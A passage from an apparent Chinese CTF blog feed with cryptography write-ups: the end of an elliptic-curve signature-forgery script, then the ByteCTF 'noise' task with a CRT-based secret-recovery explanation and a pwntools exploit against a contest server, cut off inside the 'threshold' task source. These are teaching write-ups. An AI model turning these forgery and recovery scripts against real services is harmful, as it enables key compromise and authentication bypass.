class="number">0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798</span></span><br><span class="line">gy=<span class="number">0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8</span></span><br><span class="line">order=<span class="number">0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141</span></span><br><span class="line"></span><br><span class="line">ecc = EllipticCurve(GF(q), [a,b])</span><br><span class="line">G = ecc(gx,gy)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sha1</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.sha1(content).digest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span><span class="params">(sh)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"XXXX+"</span>)</span><br><span class="line">    suffix = sh.recvuntil(<span class="string">')'</span>).decode(<span class="string">"utf8"</span>)[:<span class="number">-1</span>]</span><br><span class="line">    log.success(suffix)</span><br><span class="line">    sh.recvuntil(<span class="string">"== "</span>)</span><br><span class="line">    cipher = sh.recvline().strip().decode(<span class="string">"utf8"</span>)</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: sha256((x + suffix).encode()).hexdigest() ==  cipher, string.ascii_letters + string.digits, length=<span class="number">4</span>, method=<span class="string">'fixed'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">"Give me XXXX:"</span>, proof)</span><br><span class="line"></span><br><span class="line">proof_of_work(sh)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"Here is the frist message(64 bytes):"</span>)</span><br><span class="line">msg1 = sh.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"Here is the second message(64 bytes):"</span>)</span><br><span class="line">msg2 = sh.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>]</span><br><span class="line">message = hex(bytes_to_long(msg1))[<span class="number">2</span>:]</span><br><span class="line">e1=bytes_to_long(sha1(msg1))</span><br><span class="line">e2=bytes_to_long(sha1(msg2))</span><br><span class="line"></span><br><span class="line"><span class="comment">######################################################</span></span><br><span class="line"><span class="comment">#解题核心</span></span><br><span class="line"><span class="comment">#pubkey = sh.recvuntil("\n")[:-2].decode()</span></span><br><span class="line"><span class="comment">#r=[d * G].x</span></span><br><span class="line">d=<span class="number">12321</span></span><br><span class="line">r=int((d*G)[<span class="number">0</span>])</span><br><span class="line">new_k = ((-e1-e2)*inverse(<span class="number">2</span>*r,order))%order</span><br><span class="line">new_Q = new_k * G</span><br><span class="line">new_S = ((e1 + new_k*r)*inverse(d,order))%order</span><br><span class="line">newpubkey = hex(new_Q[<span class="number">0</span>]).replace(<span class="string">"0x"</span>,<span class="string">""</span>).rjust(<span class="number">64</span>,<span class="string">"0"</span>)+hex(new_Q[<span class="number">1</span>]).replace(<span class="string">"0x"</span>,<span class="string">""</span>).rjust(<span class="number">64</span>,<span class="string">"0"</span>)</span><br><span class="line">newsignature = hex(r).replace(<span class="string">"0x"</span>,<span class="string">""</span>).rjust(<span class="number">64</span>,<span class="string">"0"</span>)+hex(new_S).replace(<span class="string">"0x"</span>,<span class="string">""</span>).rjust(<span class="number">64</span>,<span class="string">"0"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">######################################################</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"Please choice your options:"</span>)</span><br><span class="line">sh.sendline(<span class="string">"3"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"Please give me your public_key(hex):"</span>)</span><br><span class="line">sh.sendline(newpubkey)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"Please choice your options:"</span>)</span><br><span class="line">sh.sendline(<span class="string">"6"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"Please give me the signature(hex) of the frist message:\n"</span>)</span><br><span class="line">sh.sendline(newsignature)</span><br><span class="line">sh.recvuntil(<span class="string">"Please give me the signature(hex) of the second message:\n"</span>)</span><br><span class="line">sh.sendline(newsignature)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 比赛小屋 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write Up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 ByteCTF&amp;X-NUCA</title>
      <link href="/2020/11/04/2020ByteCTF&amp;X-NUCA%E9%83%A8%E5%88%86%E5%AF%86%E7%A0%81%E5%AD%A6%E9%A2%98%E8%A7%A3/"/>
      <url>/2020/11/04/2020ByteCTF&amp;X-NUCA%E9%83%A8%E5%88%86%E5%AF%86%E7%A0%81%E5%AD%A6%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>首发于<a href="https://www.anquanke.com/post/id/221400" target="_blank" rel="noopener">安全客</a></p><p>最近打了ByteCTF和X-NUCA两场比赛，题目质量很高，（Web手们都哭了）两场比赛自己也分别只做出两道密码学方向的题目，菜狗落泪。</p><p>这里记录下自己解题的一个过程，可能废话比较多，当然也是希望能够表达的清楚。如果只是想看最终解题方法的读者可以直接跳解题流程。</p><h2 id="ByteCTF"><a href="#ByteCTF" class="headerlink" title="ByteCTF"></a>ByteCTF</h2><h3 id="noise"><a href="#noise" class="headerlink" title="noise"></a>noise</h3><p>需要前置知识或了解：中国剩余定理</p><p>task.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choices</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getrandbits</span><span class="params">(bit)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> int.from_bytes(urandom(bit &gt;&gt; <span class="number">3</span>), <span class="string">"big"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span><span class="params">()</span> -&gt; bool:</span></span><br><span class="line">    alphabet = string.ascii_letters + string.digits</span><br><span class="line">    nonce = <span class="string">""</span>.join(choices(alphabet, k=<span class="number">8</span>))</span><br><span class="line">    print(<span class="string">f'SHA256("<span class="subst">&#123;nonce&#125;</span>" + ?) starts with "00000"'</span>)</span><br><span class="line">    suffix = input().strip()</span><br><span class="line">    message = (nonce + suffix).encode(<span class="string">"Latin-1"</span>)</span><br><span class="line">    <span class="keyword">return</span> sha256(message).digest().hex().startswith(<span class="string">"00000"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    signal.alarm(<span class="number">60</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> proof_of_work():</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    secret = getrandbits(<span class="number">1024</span>)</span><br><span class="line">    print(<span class="string">"Listen...The secret iz...M2@9c0f*#aF()I!($Ud3;J..."</span></span><br><span class="line">          <span class="string">"Hello?...really noisy here again...God bless you get it..."</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            op = input().strip()</span><br><span class="line">            num = input().strip()</span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> str.isnumeric(num):</span><br><span class="line">            print(<span class="string">"INVALID NUMBER"</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        num = int(num)</span><br><span class="line">        <span class="keyword">if</span> op == <span class="string">'god'</span>:</span><br><span class="line">            print(num * getrandbits(<span class="number">992</span>) % secret)</span><br><span class="line">        <span class="keyword">elif</span> op == <span class="string">'bless'</span>:</span><br><span class="line">            <span class="keyword">if</span> num == secret:</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line">                    <span class="keyword">from</span> flag <span class="keyword">import</span> FLAG</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    FLAG = <span class="string">"but something is error. Please contact the admin."</span></span><br><span class="line"></span><br><span class="line">                print(<span class="string">"CONGRATULATIONS %s"</span>%FLAG)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            print(<span class="string">"WRONG SECRET"</span>)</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>还好，第一题代码量不大，不错不错。看一看，这一题功能很简单，你输入一个数字，他返回给你一个，你的数字 乘上一个992bit的 随机数字  模上一个1024bit的secret 的结果。当然，每次连接上后生成的secret是随机的，但是连上一次，可以交互64次，此时secret是保持不变的。算上你需要一次交互来获取flag，那么就是需要在63次之内“猜”到这个随机生成的secret。</p><p>好的，上式子，我们知道中国剩余定理是这样子的</p><p>$m \equiv c_1 \pmod {n_1}$                                    $m = c_1+k_1n_1$</p><p>$m \equiv c_2 \pmod {n_2}$            等价于            $m = c_2+k_2n_2$</p><p>$m \equiv c_3 \pmod {n_3}$                                    $m = c_3+k_3n_3$                                                        </p><p>注意这里的模是n，他们彼此互素，然后利用中国剩余定理就可以恢复m（如果m的bit位数小于所有n的bit位数之和的话）</p><p>此时，如果k都等于1，那么，</p><p>$m = c_1+n_1$                                $m = n_1+c_1$</p><p>$m = c_2+n_2$            等价于        $m = n_2+c_2$        </p><p>$m = c_3+n_3$                                $m = n_3+c_3$            </p><p>此时n和c就好像等价了，并不能知道模数到底是哪个，换一个说法就是，n和c都可以看作是模数</p><p>我们再回到这道题本身，设我们发送的值是$n_1,n_2,n_3$，secret为s，返回的值是$c_1,c_2,c_3$，</p><p>那么就会有这么些式子</p><p>$n_1 * randnum1  \equiv c_1 \pmod s = c_1+k_1s$</p><p>$n_2 * randnum2  \equiv c_2 \pmod s= c_2+k_2s$</p><p>$n_3 * randnum3  \equiv c_3 \pmod s= c_3+k_3s$</p><p>此时如果k值都为1，再挪个位置，那么就有</p><p>$s = n_1 * randnum1- c_1$</p><p>$s = n_2* randnum2 - c_2$</p><p>$s = n_3 * randnum3- c_3$</p><p>此时如果我们式子两边去一个模$n_1,n_2,n_3$</p><p>$s \equiv- c_1 \pmod{n_1}$</p><p>$s \equiv- c_2 \pmod{n_2}$</p><p>$s \equiv- c_3 \pmod{n_3}$</p><p>这不就是中国剩余定理形式么？所以当等于1，我们就可以利用中国剩余定理来恢复这个secret</p><p>需要满足的条件就是，$n*randnum = c+s$，还有就是n的bit位数之和要大于s的bit位数即1024</p><p>当然，这就需要运气了，因为他远程生成的乘数是随机的992bit数字（当然是有可能会小于992bit的），而s是1024bit的数字，所以我们要发送的n大概就是32bit的素数，32*32=1024，所以在63次交互内我们需要服务器生成32个随机数是“好”的，所谓”好””就是要让这个k正好等于1。</p><p>我们也可以先本地简单的测一测，可以选择比较小的数给他乘，这样子的k大概率会是0或者1，而0比较好判断，直接判断返回的值是否被我们发送过去的数整除就可以了。而是否正好等于1我们是无法判断的，但凡一组数据插入了一个让k不等于1或者0的数，那么整组数据就作废了。所以我们发送尽量小的数n，让k值大概率只落在0或者1上。</p><p>测试代码：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from random import *</span><br><span class="line">primes = [<span class="number">4294966427</span>, <span class="number">4294966441</span>, <span class="number">4294966447</span>, <span class="number">4294966477</span>, <span class="number">4294966553</span>, <span class="number">4294966583</span>, <span class="number">4294966591</span>, <span class="number">4294966619</span>, <span class="number">4294966639</span>, <span class="number">4294966651</span>, <span class="number">4294966657</span>, <span class="number">4294966661</span>, <span class="number">4294966667</span>, <span class="number">4294966769</span>, <span class="number">4294966813</span>, <span class="number">4294966829</span>, <span class="number">4294966877</span>, <span class="number">4294966909</span>, <span class="number">4294966927</span>, <span class="number">4294966943</span>, <span class="number">4294966981</span>, <span class="number">4294966997</span>, <span class="number">4294967029</span>, <span class="number">4294967087</span>, <span class="number">4294967111</span>, <span class="number">4294967143</span>, <span class="number">4294967161</span>, <span class="number">4294967189</span>, <span class="number">4294967197</span>, <span class="number">4294967231</span>, <span class="number">4294967279</span>, <span class="number">4294967291</span>]</span><br><span class="line"></span><br><span class="line">for _ in range(<span class="number">20</span>):</span><br><span class="line">    secret = getrandbits(<span class="number">1024</span>)</span><br><span class="line">    for num in primes:</span><br><span class="line">            print(num * getrandbits(<span class="number">992</span>) // secret),</span><br><span class="line">    print</span><br></pre></td></tr></table></figure><p>这里我们选择固定了随机数，然后经过20次的测试，下面是测试结果</p><p><img src="https://i.loli.net/2020/12/17/l4VdMyeQmps7JPt.png" alt="image-20201102145925061"></p><p>可以发现，生成的随机数似乎也具有一定程度的局部性，当k出现7，8这样比较大的数的时候，几乎整组的k都比较大，但大部分情况下，由于我们输入的素数比较小，还是只有0和1的情况偏多，但一般也是0偏多，所以，，看脸了，只要有一半以上的1，我们就成功了。</p><h4 id="解题流程："><a href="#解题流程：" class="headerlink" title="解题流程："></a>解题流程：</h4><ol><li>确定63个比较小的素数</li><li>把这些值发送过去</li><li>收到的值进行一个判断，是否被自己发过去的数整除，是就扔掉，否则就存起来</li><li>存起来的数超过32个就可以进行CRT尝试恢复secret</li><li>发送secret过去验证，要是没拿到flag就回到第2步，如此循环往复，加油吧，看你的脸了！</li></ol><p>exp：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from hashlib import <span class="built_in">sha256</span></span><br><span class="line">from tqdm import tqdm</span><br><span class="line">from Crypto.Util.<span class="keyword">number</span> import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def GCRT(mi, ai):</span><br><span class="line">    assert (isinstance(mi, <span class="keyword">list</span>) <span class="built_in">and</span> isinstance(ai, <span class="keyword">list</span>))</span><br><span class="line">    curm, cura = mi[<span class="number">0</span>], ai[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">m</span>, <span class="keyword">a</span>) in zip(mi[<span class="number">1</span>:], ai[<span class="number">1</span>:]):</span><br><span class="line">        d = <span class="keyword">int</span>(GCD(curm, <span class="keyword">m</span>))</span><br><span class="line">        <span class="keyword">c</span> = <span class="keyword">a</span> - cura</span><br><span class="line">        assert (<span class="keyword">c</span> % d == <span class="number">0</span>)</span><br><span class="line">        K = <span class="keyword">c</span> // d * inverse(curm // d, <span class="keyword">m</span> // d)</span><br><span class="line">        cura += curm * K</span><br><span class="line">        curm = curm * <span class="keyword">m</span> // d</span><br><span class="line">        cura %= curm</span><br><span class="line">    <span class="keyword">return</span> cura % curm, curm</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def proof_of_work(<span class="keyword">sh</span>):</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">"SHA256(\""</span>)</span><br><span class="line">    nonce = <span class="keyword">sh</span>.recv(<span class="number">8</span>)</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">'with \"00000\"'</span>)</span><br><span class="line">    <span class="keyword">for</span> <span class="keyword">a</span> in tqdm(<span class="built_in">range</span>(<span class="number">0</span>x30, <span class="number">0</span>x7f)):</span><br><span class="line">        <span class="keyword">for</span> <span class="keyword">b</span> in <span class="built_in">range</span>(<span class="number">0</span>x30, <span class="number">0</span>x7f):</span><br><span class="line">            <span class="keyword">for</span> <span class="keyword">c</span> in <span class="built_in">range</span>(<span class="number">0</span>x30, <span class="number">0</span>x7f):</span><br><span class="line">                <span class="keyword">for</span> d in <span class="built_in">range</span>(<span class="number">0</span>x30, <span class="number">0</span>x7f):</span><br><span class="line">                    rest = chr(<span class="keyword">a</span>) + chr(<span class="keyword">b</span>) + chr(<span class="keyword">c</span>) + chr(d)</span><br><span class="line">                    <span class="keyword">m</span> = (nonce.decode(<span class="string">'latin1'</span>) + rest).encode(<span class="string">"Latin-1"</span>)</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">sha256</span>(<span class="keyword">m</span>).digest().hex().startswith(<span class="string">"00000"</span>):</span><br><span class="line">                        <span class="keyword">sh</span>.sendline(rest)</span><br><span class="line">                        <span class="keyword">sh</span>.recvuntil(<span class="string">'again...God bless you get it...'</span>)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def io(<span class="keyword">sh</span>, num):</span><br><span class="line">    <span class="keyword">sh</span>.sendline(<span class="string">'god'</span>)</span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(num))</span><br><span class="line">    tmp = <span class="keyword">sh</span>.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(tmp) &gt; <span class="number">100</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">int</span>(tmp)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">int</span>(<span class="keyword">sh</span>.recvuntil(<span class="string">'\n'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">primes = [<span class="number">4294966427</span>, <span class="number">4294966441</span>, <span class="number">4294966447</span>, <span class="number">4294966477</span>, <span class="number">4294966553</span>, <span class="number">4294966583</span>, <span class="number">4294966591</span>, <span class="number">4294966619</span>, <span class="number">4294966639</span>, <span class="number">4294966651</span>, <span class="number">4294966657</span>, <span class="number">4294966661</span>, <span class="number">4294966667</span>, <span class="number">4294966769</span>, <span class="number">4294966813</span>, <span class="number">4294966829</span>, <span class="number">4294966877</span>, <span class="number">4294966909</span>, <span class="number">4294966927</span>, <span class="number">4294966943</span>, <span class="number">4294966981</span>, <span class="number">4294966997</span>, <span class="number">4294967029</span>, <span class="number">4294967087</span>, <span class="number">4294967111</span>, <span class="number">4294967143</span>, <span class="number">4294967161</span>, <span class="number">4294967189</span>, <span class="number">4294967197</span>, <span class="number">4294967231</span>, <span class="number">4294967279</span>, <span class="number">4294967291</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">sh</span> = remote(<span class="string">"182.92.153.117"</span>, <span class="number">30101</span>)</span><br><span class="line">    proof_of_work(<span class="keyword">sh</span>)</span><br><span class="line">    length = <span class="number">32</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">c</span> = []</span><br><span class="line">    <span class="built_in">index</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">63</span>):</span><br><span class="line">        tmp = io(<span class="keyword">sh</span>, primes[<span class="built_in">index</span>])</span><br><span class="line">        <span class="keyword">if</span> tmp%primes[<span class="built_in">index</span>] !=<span class="number">0</span>://这个判断是剔除<span class="keyword">k</span>等于<span class="number">0</span>的情况</span><br><span class="line">            <span class="keyword">c</span>.<span class="keyword">append</span>(-<span class="number">1</span> * tmp)</span><br><span class="line">            <span class="built_in">index</span> += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">index</span> &gt;= <span class="number">32</span>://如果超过<span class="number">32</span>个数的<span class="keyword">k</span>不等于<span class="number">0</span>，我们就可以拿来用了，但也不确定是否这<span class="number">32</span>个数都为<span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">index</span> &lt; <span class="number">32</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    secret = GCRT(primes, <span class="keyword">c</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">sh</span>.sendline(<span class="string">'bless'</span>)</span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(secret))</span><br><span class="line">    tmp = <span class="keyword">sh</span>.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(tmp) &lt; <span class="number">5</span>:</span><br><span class="line">        tmp = <span class="keyword">sh</span>.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">b</span><span class="string">'WRONG'</span> in tmp:</span><br><span class="line">        <span class="keyword">sh</span>.<span class="keyword">close</span>()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">print</span>(tmp)</span><br><span class="line">    <span class="keyword">sh</span>.interactive()</span><br></pre></td></tr></table></figure><p>比赛的时候大概跑了2min叭，运气还是可以的。</p><h3 id="threshold"><a href="#threshold" class="headerlink" title="threshold"></a>threshold</h3><p>需要前置知识或了解：椭圆曲线相关性质</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br></pre></td><td class="code"><pre><span class="line">from gmssl import func, sm2</span><br><span class="line"><span class="comment">#from flag import FLAG</span></span><br><span class="line">flag=<span class="string">"Congratulations!"</span></span><br><span class="line">sm2p256v1_ecc_table = &#123;</span><br><span class="line">    <span class="string">'n'</span>: <span class="string">'FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFF7203DF6B21C6052B53BBF40939D54123'</span>,</span><br><span class="line">    <span class="string">'p'</span>: <span 